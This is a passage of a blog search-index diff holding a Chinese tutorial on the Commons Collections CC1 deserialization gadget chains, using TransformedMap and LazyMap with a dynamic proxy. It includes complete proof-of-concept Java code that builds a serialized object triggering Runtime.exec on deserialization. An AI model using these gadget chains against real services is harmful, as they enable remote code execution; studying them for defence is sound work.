AnnotationType.getInstance(type);</span><br><span class="line">        &#125;</span><br><span class="line">..........</span><br><span class="line"> Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes()</span><br><span class="line"> </span><br><span class="line">String name = memberValue.getKey();</span><br><span class="line"> Class&lt;?&gt; memberType = memberTypes.get(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>通过这个代码分析我们可以知道，这里的type是我们传入的AnnotationInvocationHandler第一个参数，也就是我们传入的注解，</p>
+<p>这里就是通过 <code>AnnotationType</code> 类获取注解类型的成员名称和类型</p>
+<p>重点在于这几行代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type);//获取注解对象</span><br><span class="line"> Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes()//获取注解类型的成员类型映射表</span><br><span class="line">String name = memberValue.getKey();//获取map键值对中的key</span><br><span class="line"> Class&lt;?&gt; memberType = memberTypes.get(name)//获取key对应在注解类型中的成员值</span><br></pre></td></tr></table></figure></div>
+
+<p>这里给一个示例代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(ElementType.TYPE)</span><br><span class="line">@interface MyAnnotation &#123;</span><br><span class="line">    String value();</span><br><span class="line">    int count();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Map&lt;String, Object&gt; memberValues = new HashMap&lt;&gt;();</span><br><span class="line">        memberValues.put(&quot;count&quot;,10);</span><br><span class="line">    memberValues.put(&quot;key&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        AnnotationType annotationType = AnnotationType.getInstance(MyAnnotation.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(annotationType);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">        System.out.println(memberTypes);</span><br><span class="line"></span><br><span class="line">        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            System.out.println(&quot;=====================================================&quot;);</span><br><span class="line">            System.out.println(memberValue);</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line"></span><br><span class="line">            System.out.println(name);</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            System.out.println(memberType);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718101622716.png"
+                      alt="image-20230718101622716"
+                ></p>
+<p>那么我们想要memberType不为空，那么我输入的hashmap中的key要在注解中存在。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718101940622.png"
+                      alt="image-20230718101940622"
+                ></p>
+<p>那么我们这里可以使用@Retention注解</p>
+<p>其中存在一个成员方法value</p>
+<p>那么我们只用让我们输入的hashmap中的key值为value。</p>
+<p>即：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(&quot;value&quot;, &quot;value&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<p>那么修改后的POC就是</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ccitest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>再次调试：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718102530567.png"
+                      alt="image-20230718102530567"
+                ></p>
+<p>我们修改后的hashmap中的key值在注解中存在。那获取注解键值对对应的值就不会为空了。</p>
+<p>那我们就满足了这个if</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object value = memberValue.getValue();</span><br><span class="line">if (!(memberType.isInstance(value) ||</span><br></pre></td></tr></table></figure></div>
+
+<p>java.lang.Class类的isInstance()方法用于检查指定的对象是否兼容分配给该Class的实例。如果指定对象为非null，并且可以强制转换为此类的实例，则该方法返回true。否则返回false。</p>
+<p>那么我们这个这里明显是不能强转的，所以这里我们就能直接过去。</p>
+<p>但是我们这里运行还是会报错</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718103552703.png"
+                      alt="image-20230718103552703"
+                ></p>
+<h3 id="解决setValue传入值不可控问题"><a href="#解决setValue传入值不可控问题" class="headerlink" title="解决setValue传入值不可控问题"></a>解决setValue传入值不可控问题</h3><p>出现报错的原因就是因为我们前面说的setvalue传入值不可控的问题</p>
+<p>因为这里要传的value的值其实就是我们构造的runtime对象.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718103719820.png"
+                      alt="image-20230718103719820"
+                ></p>
+<p>但是这里我们明显是不可控的</p>
+<p>我们这里可以通过ConstantTransformer类来实现这个这一步：</p>
+<p>我们在这里先大概了解ConstantTransformer：</p>
+<p><code>ConstantTransformer</code> 是 Apache Commons Collections 库中的一个类，用于创建一个始终返回固定值的转换器。</p>
+<p>在 <code>ConstantTransformer</code> 中，你可以指定一个固定的值作为转换器的输出。该转换器在应用 <code>transform</code> 方法时，始终返回这个固定的值。以下是 <code>ConstantTransformer</code> 的构造方法和主要方法：</p>
+<p>构造方法：</p>
+<ul>
+<li><code>ConstantTransformer(Object constant)</code>：创建一个 <code>ConstantTransformer</code> 对象，使用指定的常量作为固定值。</li>
+</ul>
+<p>主要方法：</p>
+<ul>
+<li><code>transform(Object input)</code>：应用转换器，返回固定的值。</li>
+</ul>
+<p>通过使用 <code>ConstantTransformer</code>，你可以将一个固定值包装成一个转换器，用于在各种场景中进行转换操作。例如，你可以使用 <code>ConstantTransformer</code> 创建一个始终返回特定字符串的转换器，或者创建一个始终返回某个预定义对象的转换器。</p>
+<p>示例代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc11 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建一个 ConstantTransformer，固定返回字符串 &quot;Hello, World!&quot;</span><br><span class="line">        Transformer constantTransformer = ConstantTransformer.getInstance(&quot;hello&quot;);</span><br><span class="line">        // 应用转换器，输出固定的值</span><br><span class="line">        String result = (String) constantTransformer.transform(&quot;input&quot;);</span><br><span class="line">        System.out.println(&quot;Result: &quot; + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们看一下源码中的ConstantTransformer的构造方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718110327568.png"
+                      alt="image-20230718110327568"
+                ></p>
+<p>这里传入一个对象并赋值给 <code>iConstant</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718110424089.png"
+                      alt="image-20230718110424089"
+                ></p>
+<p>第二个方法<code>transform</code> ，接收一个对象，然后直接返回 <code>iConstant</code>。</p>
+<p>那我们可以把这里返回的iConstant对象修改为我们获取的Runtime.class对象，那么这里无论接受什么都会返回这个虚拟机对象</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                                annotationType.members().get(name))</span><br></pre></td></tr></table></figure></div>
+
+<p>那我们这里接受这个AnnotationTypeMismatchExceptionProxy对象，在ConstantTransformer的transform方法下就直接返回了我们的虚拟机对象，解决了传入参数值不可控的问题</p>
+<p>而且这里调用的也是transform方法，那么我们就可以写入到chainedTransformer中去循环调用。</p>
+<h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><p>那么修改一下我们的POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class ccitest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718115431082.png"
+                      alt="image-20230718115431082"
+                ></p>
+<p>计算机程序打开成功了，那么到这里我们这条链就已经构造完了</p>
+<p>利用链：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    AbstractInputCheckedMapDecorator.setValue()</span><br><span class="line">        TransformedMap.checkSetValue()</span><br><span class="line">          ChainedTransformer.transform()</span><br><span class="line">            ConstantTransformer.transform()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Class.getMethod()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.getRuntime()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.exec()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="cc1-LazyMap-利用链分析"><a href="#cc1-LazyMap-利用链分析" class="headerlink" title="cc1 LazyMap 利用链分析"></a>cc1 LazyMap 利用链分析</h2><p> LazyMap 利用链和TranformedMap利用链后半部分都是一样的</p>
+<p>这条链是ysoserial项目中的CC1利用链</p>
+<p>我们在调用了InvokerTransformer类中的transform方法时，在第一条链中我们用的是TransformedMap方法中的checksetValue方法</p>
+<p>但是Lazymap中的get方法也是可以利用的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718121037838.png"
+                      alt="image-20230718121037838"
+                ></p>
+<p>跟进到LazyMap的get方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718121215884.png"
+                      alt="image-20230718121215884"
+                ></p>
+<p>我们可以看到这里factory调用了transform方法，key是get方法传入的，是可控的</p>
+<p>向上找看factory是否可控</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718121513387.png"
+                      alt="image-20230718121513387"
+                ></p>
+<p>在LazyMap的构造方法中找到了factory的传参</p>
+<p>但是这个方法是受保护的方法，我们不能直接调用</p>
+<p>继续找看有没有能够调用这个方法的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718121636115.png"
+                      alt="image-20230718121636115"
+                ></p>
+<p>可以看到这里有一个静态方法decorate调用了Lazymap的构造方法，，并且参数完全可控</p>
+<p>到这里为止，这条链子和我们TranformedMap的利用链是非常相似的</p>
+<p>那我这里就可以调用decorate静态方法进而调用LazyMap的构造方法，从而是factory可控，进而调用transform()方法</p>
+<p>那我们这里可以编写POC:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ccitest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt;  lazyMap = LazyMap.decorate(map, null, chainedTransformer);</span><br></pre></td></tr></table></figure></div>
+
+<p>前面的代码都是一样的，只用这里修改为 LazyMap</p>
+<p>同样的思路继续向上找哪里调用了get</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718122743403.png"
+                      alt="image-20230718122743403"
+                ></p>
+<p>在很对类中都调用了get方法，我们这条链用的是AnnotationInvocationHandler类中的invoke方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718122921778.png"
+                      alt="image-20230718122921778"
+                ></p>
+<p>这里的memberValues调用了get方法</p>
+<p>根据我们上条链分析我们知道这个memberValues的值是可控的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    if (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != 1 ||</span><br><span class="line">        superInterfaces[0] != java.lang.annotation.Annotation.class)</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    this.type = type;</span><br><span class="line">    this.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>但是我们这里去找readobject调用时没有的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718123411905.png"
+                      alt="image-20230718123411905"
+                ></p>
+<p>可以发现这里并没有调用关系，找到的都是其他类里面的实现方法</p>
+<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>但是我们想要实现这条链的利用可以使用动态代理来实现</p>
+<p>关于什么是动态代理，可以参考下面两个视频学习：</p>
+<p><a class="link"   href="https://www.bilibili.com/video/BV1ue411N7GX/?p=2&spm_id_from=pageDriver&vd_source=fc5b727bddb8d056176195c541dcca51" >https://www.bilibili.com/video/BV1ue411N7GX/?p=2&amp;spm_id_from=pageDriver&amp;vd_source=fc5b727bddb8d056176195c541dcca51 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?p=3&vd_source=f775da115bc8ec53ca2933be0602dc26" >https://www.bilibili.com/video/BV16h411z7o9/?p=3&amp;vd_source=f775da115bc8ec53ca2933be0602dc26 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>我们这里简单的了解一下：</p>
+<p><strong>首先什么是代理?</strong></p>
+<p>代理是一种设计模式，用于控制对对象的访问。它允许你创建一个代理对象，该对象可以替代原始对象执行某些操作，同时隐藏原始对象的细节。代理对象充当了原始对象的代表，客户端程序将请求发送给代理对象，然后由代理对象将请求传递给原始对象。代理对象可以在传递请求之前或之后执行一些附加操作，例如权限验证、缓存、日志记录、远程调用等。</p>
+<p><strong>静态代理：</strong></p>
+<p>在程序运行前就已经存在代理类的字节码文件，代理类和被目标类的关系在运行前就确定了</p>
+<p><strong>动态代理：</strong></p>
+<p>在运行时创建代理对象。动态代理使用Java的反射机制，可以在运行时动态生成代理对象，无需为每个类创建独立的代理类。</p>
+<p><strong>如何使用动态代理：</strong></p>
+<ol>
+<li>通过实现<code>InvovationHandler</code>接口创建自己的调用处理器</li>
+<li>通过为<code>Proxy</code>类指定ClassLoader对象和一组Interface来创建动态代理类</li>
+<li>通过反射机制获取动态代理类的构造函数，其唯一参数类型是<code>InvocationHandler</code>接口类型</li>
+<li>通过构造函数创建动态代理类实例，调用处理器对象（<code>InvocationHandler</code>接口的实现类实例）作为参数传入</li>
+</ol>
+<h3 id="Poc构造："><a href="#Poc构造：" class="headerlink" title="Poc构造："></a>Poc构造：</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718175625223.png"
+                      alt="image-20230718175625223"
+                ></p>
+<p>AnnotationInvocationHandler类以及实现了InvocationHandler接口，那我们可以使用动态代理去代理LazMap对象，因为动态代理类都需要传入一个实现了InvocationHandler接口的类，并且这个类要重写一个<code>invoke()</code>方法，而当动态代理类的代理对象调用任意方法的时候，就会进入到这个实现了InvocationHandler接口的类中的<code>invoke()</code>方法。</p>
+<p>我们如果将这个对象用Proxy进行代理，那么在<code>readObject()</code>的时候，只要调用任意方法，就会进入到 <code>AnnotationInvocationHandler#invoke</code> 方法中，进而触发我们的 <code>LazyMap#get</code> 。</p>
+<p>然后我们这里先对对 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 对象进行Proxy：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">      // 反射获取 AnnotationInvocationHandler 构造方法</span><br><span class="line">      Constructor&lt;?&gt; AnnotationInvocationHandlerConstrucor = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">      // 创建对象</span><br><span class="line">      AnnotationInvocationHandlerConstrucor.setAccessible(true);</span><br><span class="line">      InvocationHandler annHandObject = (InvocationHandler) AnnotationInvocationHandlerConstrucor.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">      // 动态代理 annHandObject</span><br><span class="line">      Map o = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, annHandObject);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>代码这里看到我们代理后的对象是proxyMap，但我们这里不能直接对它进行序列化，因为这里我们的入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject</p>
+<p>所以我们这里用AnnotationInvocationHandler对这个proxyMap进行实例化：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object serializableObject = AnnotationInvocationHandlerConstrucor.newInstance(Retention.class, o);</span><br></pre></td></tr></table></figure></div>
+
+<p>那么根据我们上面的分析，我们可以构造出</p>
+<h3 id="最终的POC："><a href="#最终的POC：" class="headerlink" title="最终的POC："></a>最终的POC：</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc12 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 恶意代码调用链</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                // 获取 Runtime 对象</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                // 获取 exec 的 Method 对象并调用 invoke 执行 calc</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap&lt;&gt;(), chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 反射获取 AnnotationInvocationHandler class 对象</span><br><span class="line">        Class&lt;?&gt; AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        // 反射获取 AnnotationInvocationHandler 构造方法</span><br><span class="line">        Constructor&lt;?&gt; AnnotationInvocationHandlerConstrucor = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        // 创建对象</span><br><span class="line">        AnnotationInvocationHandlerConstrucor.setAccessible(true);</span><br><span class="line">        InvocationHandler annHandObject = (InvocationHandler) AnnotationInvocationHandlerConstrucor.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        // 动态代理 annHandObject</span><br><span class="line">        Map o = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, annHandObject);</span><br><span class="line"></span><br><span class="line">        // 实例化代理对象</span><br><span class="line">        Object serializableObject = AnnotationInvocationHandlerConstrucor.newInstance(Retention.class, o);</span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        serializable(serializableObject);</span><br><span class="line">        // 反序列化</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230718194203547.png"
+                      alt="image-20230718194203547"
+                ></p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
 </search>
